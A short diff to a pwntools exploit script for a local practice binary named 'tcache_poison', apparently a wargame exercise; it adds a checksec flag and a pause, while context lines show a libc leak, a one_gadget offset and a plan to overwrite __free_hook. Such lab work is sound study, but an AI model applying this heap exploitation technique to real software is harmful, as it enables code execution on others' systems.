@@ -2,7 +2,7 @@ from pwn import *
 
 p = process("./tcache_poison")
 e = ELF("./tcache_poison")
-libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so")
+libc = ELF("/lib/x86_64-linux-gnu/libc-2.27.so", checksec=False)
 
 def slog(symbol, addr): return success(symbol + ": " + hex(addr))
 
@@ -53,6 +53,7 @@ og = lb + 0x4f302
 slog("free_hook", fh)
 slog("one_gadget", og)
 
+pause()
 # Overwrite the `__free_hook` with the address of one_gadget
 alloc(0x40, "dreamhack")
 free()
